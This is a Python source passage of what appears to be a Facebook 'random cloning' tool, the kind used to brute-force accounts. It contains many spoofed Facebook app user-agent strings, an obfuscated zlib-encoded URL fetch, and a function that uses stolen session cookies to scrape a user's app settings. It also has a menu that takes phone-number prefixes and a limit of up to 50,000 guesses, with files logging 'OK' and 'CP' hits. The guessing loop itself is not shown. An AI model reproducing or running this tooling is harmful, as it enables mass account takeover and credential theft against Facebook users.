    "FBAN/FB4A;FBAV/395.0.0.9.185;FBBV/333064569;FBDM/{density=2.2,width=1080,height=1421};FBLC/id_ID;FBRV/248172060;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/MI MAX 2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/248.0.0.4.173;FBBV/853027753;FBDM/{density=2.2,width=1080,height=1457};FBLC/nl_NL;FBRV/205926323;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/236.0.0.1.157;FBBV/973131259;FBDM/{density=3.4,width=1080,height=1442};FBLC/es_ES;FBRV/438327240;FBCR/Tele2You;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2007J20CG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/333.0.0.2.109;FBBV/125462675;FBDM/{density=3.4,width=1080,height=1443};FBLC/hi_IN;FBRV/522465335;FBCR/Jazz;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/363.0.0.9.182;FBBV/206195166;FBDM/{density=2.4,width=1080,height=1408};FBLC/cs_CZ;FBRV/639116943;FBCR/Tele2 LT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/386.0.0.6.162;FBBV/316270744;FBDM/{density=2.2,width=1080,height=1419};FBLC/ru_RU;FBRV/327063785;FBCR/MtelBG;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/334.0.0.8.99;FBBV/219271349;FBDM/{density=2.2,width=1080,height=1458};FBLC/pl_PL;FBRV/794043356;FBCR/EE;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/305.0.0.3.141;FBBV/907351830;FBDM/{density=2.5,width=1080,height=1421};FBLC/en_GB;FBRV/799833329;FBCR/EE;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/368.0.0.5.163;FBBV/470819323;FBDM/{density=3.4,width=1080,height=1428};FBLC/cs_CZ;FBRV/719782766;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/341.0.0.6.136;FBBV/821870884;FBDM/{density=3.5,width=1080,height=1439};FBLC/cs_CZ;FBRV/316102432;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/311.0.0.4.197;FBBV/959529695;FBDM/{density=3.3,width=1080,height=1422};FBLC/en_US;FBRV/898856923;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/276.0.0.7.173;FBBV/299855126;FBDM/{density=2.5,width=1080,height=1465};FBLC/en_IN;FBRV/489691046;FBCR/Vi India;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/337.0.0.9.111;FBBV/734992081;FBDM/{density=3.5,width=1080,height=1499};FBLC/es_ES;FBRV/737957830;FBCR/Banglalink;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/211.0.0.2.180;FBBV/533402391;FBDM/{density=2.4,width=1080,height=1487};FBLC/es_ES;FBRV/799013304;FBCR/Ufone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/203.0.0.2.108;FBBV/133763430;FBDM/{density=2.4,width=1080,height=1407};FBLC/he_IL;FBRV/330264488;FBCR/Oi;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/251.0.0.6.185;FBBV/200619978;FBDM/{density=2.4,width=1080,height=1417};FBLC/he_IL;FBRV/309350022;FBCR/Ufone;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/206.0.0.5.163;FBBV/384956526;FBDM/{density=3.5,width=1080,height=1431};FBLC/hi_IN;FBRV/493241268;FBCR/MtelBG;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/252.0.0.1.163;FBBV/457269985;FBDM/{density=2.5,width=1080,height=1427};FBLC/en_GB;FBRV/223591357;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI MAX 2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/382.0.0.4.185;FBBV/626342772;FBDM/{density=2.3,width=1080,height=1434};FBLC/lt_LT;FBRV/281400984;FBCR/Ufone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/307.0.0.2.140;FBBV/704588137;FBDM/{density=2.2,width=1080,height=1422};FBLC/lt_LT;FBRV/553435089;FBCR/Ufone;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2010J19CG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/210.0.0.8.167;FBBV/127284448;FBDM/{density=2.3,width=1080,height=1435};FBLC/en_GB;FBRV/420420404;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/308.0.0.5.151;FBBV/579433762;FBDM/{density=2.3,width=1080,height=1450};FBLC/hi_IN;FBRV/732125651;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K9G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/381.0.0.8.172;FBBV/609627612;FBDM/{density=2.4,width=1080,height=1472};FBLC/ it_IT;FBRV/596732652;FBCR/Ufone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/311.0.0.5.162;FBBV/492302613;FBDM/{density=2.4,width=1080,height=1424};FBLC/ru_RU;FBRV/531103051;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/235.0.0.3.170;FBBV/712346985;FBDM/{density=3.5,width=1080,height=1489};FBLC/en_GB;FBRV/911533462;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/376.0.0.3.103;FBBV/213696303;FBDM/{density=2.5,width=1080,height=1475};FBLC/nl_NL;FBRV/984741165;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2011K2C;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/268.0.0.9.131;FBBV/151222271;FBDM/{density=3.3,width=1080,height=1431};FBLC/en_IN;FBRV/295059142;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/329.0.0.7.177;FBBV/307393345;FBDM/{density=3.2,width=1080,height=1417};FBLC/pt_PT;FBRV/976402820;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2012K11AG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/333.0.0.2.169;FBBV/528443796;FBDM/{density=3.3,width=1080,height=1432};FBLC/hi_IN;FBRV/342276937;FBCR/Jazz;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/203.0.0.2.139;FBBV/978504811;FBDM/{density=3.3,width=1080,height=1484};FBLC/ it_IT;FBRV/890434785;FBCR/Sprint;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2012K11AG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/349.0.0.2.193;FBBV/524369907;FBDM/{density=2.2,width=1080,height=1406};FBLC/en_GB;FBRV/628173263;FBCR/MtelBG;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/331.0.0.1.101;FBBV/920495442;FBDM/{density=3.3,width=1080,height=1470};FBLC/pl_PL;FBRV/338094680;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/340.0.0.2.139;FBBV/569555858;FBDM/{density=3.5,width=1080,height=1483};FBLC/nl_NL;FBRV/875548930;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/260.0.0.3.155;FBBV/157289057;FBDM/{density=2.2,width=1080,height=1429};FBLC/he_IL;FBRV/550957248;FBCR/Tele2You;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/319.0.0.4.135;FBBV/427023410;FBDM/{density=2.5,width=1080,height=1436};FBLC/en_PK;FBRV/480753876;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/212.0.0.2.188;FBBV/830200379;FBDM/{density=2.4,width=1080,height=1439};FBLC/es_ES;FBRV/889724123;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/276.0.0.5.105;FBBV/742530592;FBDM/{density=2.2,width=1080,height=1408};FBLC/pl_PL;FBRV/925976405;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/AT&amp;amp-T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/371.0.0.9.129;FBBV/376807011;FBDM/{density=2.3,width=1080,height=1467};FBLC/lt_LT;FBRV/188732437;FBCR/EE;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/302.0.0.5.116;FBBV/578275491;FBDM/{density=3.5,width=1080,height=1465};FBLC/he_IL;FBRV/809868925;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/ Mi 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/392.0.0.1.156;FBBV/280211658;FBDM/{density=3.4,width=1080,height=1449};FBLC/id_ID;FBRV/347230102;FBCR/MtelBG;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/353.0.0.9.138;FBBV/729972942;FBDM/{density=2.4,width=1080,height=1451};FBLC/en_PK;FBRV/809073252;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/315.0.0.8.111;FBBV/640672899;FBDM/{density=3.5,width=1080,height=1467};FBLC/nl_NL;FBRV/675911863;FBCR/Telenor;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/369.0.0.6.114;FBBV/557612703;FBDM/{density=3.4,width=1080,height=1459};FBLC/id_ID;FBRV/769078908;FBCR/Vi India;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/279.0.0.4.153;FBBV/267246342;FBDM/{density=3.2,width=1080,height=1497};FBLC/en_US;FBRV/373967218;FBCR/Vodafone IN;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/206.0.0.3.152;FBBV/901715453;FBDM/{density=3.2,width=1080,height=1402};FBLC/id_ID;FBRV/743966849;FBCR/AT&amp;amp-T;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/200.0.0.9.130;FBBV/186868798;FBDM/{density=2.2,width=1080,height=1416};FBLC/nl_NL;FBRV/844850684;FBCR/Oi;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/377.0.0.7.134;FBBV/288953980;FBDM/{density=3.2,width=1080,height=1429};FBLC/ru_RU;FBRV/926564585;FBCR/Oi;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/286.0.0.4.160;FBBV/725209717;FBDM/{density=2.5,width=1080,height=1466};FBLC/id_ID;FBRV/521862655;FBCR/Sprint;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/300.0.0.7.137;FBBV/606158909;FBDM/{density=2.4,width=1080,height=1484};FBLC/pl_PL;FBRV/775176792;FBCR/Jazz;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/391.0.0.3.103;FBBV/125233167;FBDM/{density=2.4,width=1080,height=1450};FBLC/ it_IT;FBRV/355002830;FBCR/MtelBG;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/289.0.0.7.192;FBBV/581823484;FBDM/{density=2.4,width=1080,height=1483};FBLC/id_ID;FBRV/845569598;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/299.0.0.7.196;FBBV/405678679;FBDM/{density=3.3,width=1080,height=1499};FBLC/es_ES;FBRV/465728378;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/280.0.0.3.188;FBBV/746592368;FBDM/{density=2.2,width=1080,height=1490};FBLC/en_GB;FBRV/985618460;FBCR/Vi India;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7A;FBSV/9;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/265.0.0.8.106;FBBV/946906226;FBDM/{density=3.4,width=1080,height=1477};FBLC/en_US;FBRV/615215230;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;",
    "FBAN/FB4A;FBAV/217.0.0.8.133;FBBV/183003267;FBDM/{density=2.2,width=1080,height=1441};FBLC/ru_RU;FBRV/478074034;FBCR/FASTWEB;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7BG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;",
    ]
#───────────────[ INDICATION ]─────────────────────────#
id,id2,loop,oki,cpi,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
ok,cp=0,0
cokbrut=[]
pwpluss,pwnya=[],[]
#───────────────[ COLOR-LIST]─────────────────────────#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' 
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
###───────────────[ ANSII COLOR STYLE]─────────────────────────###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
###───────────────[ RICH COLOR STYLE ]─────────────────────────###
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'
RED = '\033[1;31m'
WHITE = '\033[1;37m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
pink = '\033[1;35m'
G3 = '\x1b[38;5;48m'
RED = '\033[1;31m'
WHITE = '\033[1;37m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
pink = '\033[1;35m'
G3 = '\x1b[38;5;48m'
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
red="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"

try:
    version = requests.get(zlib.decompress(b'x^\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5w\xf4r\x8ct\xf4310\xd1\x0f-HI,I\xd5+\xa9(\xd1\xcfM\xcc\xcc\xd3\x0fK-*\xce\xcc\xcf\x03\t\x00\x00\xab\xe0\x1a\x00')).text
except:
    print('No Internet Connection.....');exit()
version = version.strip()
#───────────────[ CONVERTER-BULAN ]─────────────────────────#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#───────────────SECURITY───────────────#
#───────────────[ APPLICATION CHECKER ]───────────────#
def cek_apk(kuki):
    session = requests.Session()
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": "noscript=1;" + kuki}).text
    sop = bs4.BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print("\r%s  \033[0m➛ %s%s" % (P, H, game[i].replace("Added on", " Added on")))
    except AttributeError:
        print("\r    %s\033[0m cookie invalid" % (M))
    
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": "noscript=1;" + kuki}).text
    sop = bs4.BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print("\r%s  \033[0m➛ %s" % (P, game[i].replace("Expired", " Expired")))
    except AttributeError:
        print("\r    %s \033[0mcookie invalid" % (M))
#───────────────[ YEAR-CHECKER ]───────────────#
#───────────────[ BOT-SUPPORT ]───────────────#
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
os.system('')
today = '\033[1;36m'+str(hari)+'\033[1;97m-\033[1;36m'+str(bulan)+'\033[1;97m-\033[1;36m'+str(tahun)
sys.stdout.write('\x1b]2; Zer0~XD\x07')
#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def linex():
    print(f'\r\033[1;92m  ═══════════════════════════════════════════════════')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.06)
logo =f'''\033[1;36m
  ______          ___         _____  
 |___  /         / _ \       |  __ \ 
    / / ___ _ __| | | | __  _| |  | |
   / / / _ \ '__| | | | \ \/ / |  | |
  / /_|  __/ |  | |_| |  >  <| |__| |
 /_____\___|_|   \___/  /_/\_\_____/ 
                                     \x1b[38;1;97m ᴾᴿᴼ
{faltu} {black}Your self-worth is determined by you... {pvt}\033[38;5;196m :{today} 
{red}[{white}🔖{red}] {yelloww}ONWER AND CEO {white}▶︎ {yelloww}𝐜𝐡𝐨𝐲𝐨𝐧 {red}𝐗 {yelloww}𝐬𝐮𝐦𝐨𝐧
{red}[{white}🔖{red}] {green}VERSION \033[38;5;196m  :\x1b[38;1;97m {version}
{red}[{white}🔖{red}] {green}TOOLS \033[38;5;196m    :\x1b[38;1;97m FREE
{red}[{white}🔖{red}] {green}THIS TOOL RANDOM TYPES
{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'''
os.system('clear')
print(logo)
uname = input('\033[1;91m[\033[1;92m🔖\033[1;91m]\033[1;92m YOUR NAME \033[1;91m: \033[1;35m')
#───────────────[ MAIN MENU ]───────────────#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.008)
import os

def menu():
    os.system('clear')
    print(logo)
    jalan(f"\033[1;31m[\033[1;37m🔖\033[1;31m] \033[1;92mUSER NAME\033[1;91m :\033[1;37m "+uname)
    jalan('\033[1;37m═══════════════════════════════════════════════════')
    jalan(f"""\033[1;31m[\033[1;37m1\033[1;31m] \033[1;32mRANDOM CLONING""")
    jalan(f"""\033[1;31m[\033[1;37m2\033[1;31m] \033[1;32mJOIN MESSENGER GROUP""")
    jalan("""\033[1;31m[\033[1;37m0\033[1;31m] \033[1;91mEXIT""")
    jalan('\033[1;37m═══════════════════════════════════════════════════')
    SHAJON = input('\033[1;31m[\033[1;37m?\033[1;31m] \033[1;32mCHOOSE\033[1;37m :\033[0;95m ')
    os.system('clear')
    print(logo)
    if SHAJON in ['1','01']:
        all_rndm()
    elif SHAJON in ['2','02']:
        os.system('xdg-open https://m.me/j/AbZFaUhxTEhvQagV/')
        menu()
    elif SHAJON in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        jalan('\033[1;93m═══════════════════════════════════════════════════')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        animation(' [×] SELECT CORRECTLY ')
        menu()
#───────────────[ OLD - MENU ]───────────────# 
from concurrent.futures import ThreadPoolExecutor as ThreadPool
loop = 0
oks = []
cps = []
#__________________| UNIVERSAL RANDOM CLONE|__________________#
def all_rndm():
    user = []
    clear()
    os.system('clear')
    print(logo)
    jalan(f'\033[1;31m[\033[1;37m🔖\033[1;31m]\033[1;37m \x1b[38;5;46m[CHOICE YOUR COUNTRY CODE]')
    jalan(f'\033[1;31m[\033[1;37m🔖\033[1;31m]\033[1;37m \x1b[38;5;46mEXAMPLE [BD] : 01776 | 01991 | 01881 | 01662 ')
    jalan(f'\033[1;31m[\033[1;37m🔖\033[1;31m]\033[1;37m \x1b[38;5;46mEXAMPLE [INDIA] : 7849 | 6399 | 6360 | 9062 ')
    jalan(f'\033[1;31m[\033[1;37m🔖\033[1;31m]\033[1;37m \x1b[38;5;46mEXAMPLE [NEPAL] : 9815 | 9814 | 9861 | 9840 ')
    jalan(f'\033[1;31m[\033[1;37m🔖\033[1;31m]\033[1;37m \x1b[38;5;46mEXAMPLE [PAKISTAN] : 0306 | 0335 | 0315 | 0345 ')
    jalan('\033[1;37m═══════════════════════════════════════════════════')
    code = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m \x1b[38;5;46mCHOICE  : ')
    clear()
    os.system('clear')
    print(logo)
    jalan(f'\033[1;31m[\033[1;37m🔖\033[1;31m]\033[1;37m \x1b[38;5;46mEXAMPLE : 3000 | 5000 | 10000 | 99999 ')
    jalan('\033[1;37m═══════════════════════════════════════════════════')
    try:
        limit = int(input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m \x1b[38;5;46mCHOICE  : '))
    except ValueError:
        limit = 50000
    clear()
    os.system('clear')
    print(logo)
    jalan(f'\033[1;31m[\033[1;37m1\033[1;31m]\033[1;37m \x1b[38;5;46mMETHOD ')
    jalan(f'\033[1;31m[\033[1;37m2\033[1;31m]\033[1;37m \x1b[38;5;46mMETHOD ')
    jalan(f'\033[1;31m[\033[1;37m3\033[1;31m]\033[1;37m \x1b[38;5;46mMETHOD ')
    jalan(f'\033[1;31m[\033[1;37m4\033[1;31m]\033[1;37m \x1b[38;5;46mMETHOD ')
    jalan(f'\033[1;31m[\033[1;37m5\033[1;31m]\033[1;37m \x1b[38;5;46mMETHOD ')
    jalan('\033[1;37m═══════════════════════════════════════════════════')
    try:
        mthd = input(f'\033[1;31m[\033[1;37m?\033[1;31m]\033[1;37m \x1b[38;5;46mCHOICE  : ')
        if mthd not in ['1', '2', '3', '4', '5', '01', '02', '03', '04', '05']:
            raise ValueError
    except ValueError:
        mthd = '1'
